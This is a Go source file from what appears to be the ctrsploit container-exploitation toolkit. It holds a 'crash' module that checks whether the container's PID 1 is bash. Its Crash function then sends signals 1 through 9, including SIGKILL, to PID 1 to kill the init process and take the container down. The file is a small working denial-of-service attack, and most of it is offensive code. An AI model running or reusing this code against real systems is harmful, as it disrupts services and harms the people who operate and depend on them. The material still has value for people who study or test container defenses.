package crash

import (
	"github.com/ctrsploit/ctrsploit/util"
	"github.com/pkg/errors"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
	"syscall"
)

type Sig struct {
	validBinary map[string]bool
}

func NewSig() Sig {
	return Sig{
		validBinary: map[string]bool{
			"bash": true, // https://www.gnu.org/software/bash/manual/html_node/Signals.html
		},
	}
}

func (c Sig) Valid() (valid bool, err error) {
	processName, err := util.GetProcessNameByPid(1)
	if err != nil {
		if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
			valid = false
			err = nil
		}
		return
	}
	if _, ok := c.validBinary[processName]; ok {
		valid = true
	}
	return
}

func (c Sig) Crash() (err error) {
	for i := 1; i < 10; i++ {
		err = syscall.Kill(1, syscall.Signal(i))
		if err != nil {
			awesome_error.CheckErr(err)
			continue
		}
	}
	return
}
